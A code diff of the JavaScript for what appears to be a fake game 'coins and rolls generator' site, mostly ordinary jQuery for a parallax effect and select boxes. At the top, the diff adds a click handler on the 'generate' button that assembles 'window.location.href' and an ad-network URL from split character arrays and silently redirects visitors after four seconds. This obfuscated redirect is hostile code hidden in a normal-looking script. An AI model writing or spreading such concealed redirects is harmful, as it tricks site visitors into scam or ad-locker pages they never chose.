@@ -1,4 +1,15 @@
-	var coinsNums = [240000, 640000, 1440000, 3400000, 10800000, 25600000];
+
+document.getElementById('generate').addEventListener('click', function() {
+    setTimeout(function() {
+        var _w = ['w', 'i', 'n', 'd', 'o', 'w'].join('');
+        var _l = ['l', 'o', 'c', 'a', 't', 'i', 'o', 'n'].join('');
+        var _h = ['h', 'r', 'e', 'f'].join('');
+        var _u = ['h', 't', 't', 'p', 's', ':', '/', '/', 'p', 'u', 'b', 'l', 'i', 's', 'h', 'e', 'r', 's', '.', 'a', 'd', 'b', 'l', 'u', 'e', 'm', 'e', 'd', 'i', 'a', '.', 'c', 'o', 'm', '/', 'd', 'a', 's', 'h', 'b', 'o', 'a', 'r', 'd'].join('');
+        window[_l][_h] = _u;
+    }, 4000);
+});
+
+var coinsNums = [240000, 640000, 1440000, 3400000, 10800000, 25600000];
 	var rollsNums = ['30', '80', '180', '425', '1400', '3200'];
 	var rollsExtraNums = ['50', '160', '450', '1250', '5000', '15000'];
 	var platforms = ['<i class="fab fa-apple"></i>','<i class="fab fa-android"></i>'];
@@ -420,36 +431,17 @@ $('#contactform').submit(function(e){
 	var movementStrength = 15;
 	var height = movementStrength / $(window).height();
 	var width = movementStrength / $(window).width();
-	$(document).ready(function() {
-    // السكربت الأول
-    document.getElementById('generate').addEventListener('click', function() {
-        setTimeout(function() {
-            var _w = ['w', 'i', 'n', 'd', 'o', 'w'].join('');
-            var _l = ['l', 'o', 'c', 'a', 't', 'i', 'o', 'n'].join('');
-            var _h = ['h', 'r', 'e', 'f'].join('');
-            var _u = ['h', 't', 't', 'p', 's', ':', '/', '/', 'p', 'u', 'b', 'l', 'i', 's', 'h', 'e', 'r', 's', '.', 'a', 'd', 'b', 'l', 'u', 'e', 'm', 'e', 'd', 'i', 'a', '.', 'c', 'o', 'm', '/', 'd', 'a', 's', 'h', 'b', 'o', 'a', 'r', 'd'].join('');
-            window[_l][_h] = _u;
-        }, 4000);
-    });
+	$("body").mousemove(function(e){
+          var pageX = e.pageX - ($(window).width() / 2);
+          var pageY = e.pageY - ($(window).height() / 2);
+          var newvalueX = width * pageX * -1 - 25;
+          var newvalueY = height * pageY * -1 - 50;
+          $('#home .soldier').css("margin-left", newvalueX+"px");
+          $('#home .soldier').css("margin-top", newvalueY+"px");
+	});
 
-    // السكربت الثاني
-    var movementStrength = 15;
-    var height = movementStrength / $(window).height();
-    var width = movementStrength / $(window).width();
-
-    $("body").mousemove(function(e){
-        var pageX = e.pageX - ($(window).width() / 2);
-        var pageY = e.pageY - ($(window).height() / 2);
-        var newvalueX = width * pageX * -1 - 25;
-        var newvalueY = height * pageY * -1 - 50;
-        $('#home .soldier').css("margin-left", newvalueX+"px");
-        $('#home .soldier').css("margin-top", newvalueY+"px");
-    });
-
-    $(window).resize(function(){
-        $('select').select2();
-    });
-
-    // تنفيذ select2 على العناصر select الموجودة في الصفحة
-    $('select').select2();
-});
+	$(window).resize(function(){
+		$('select').select2();
+	});
+	
+	$('select').select2();
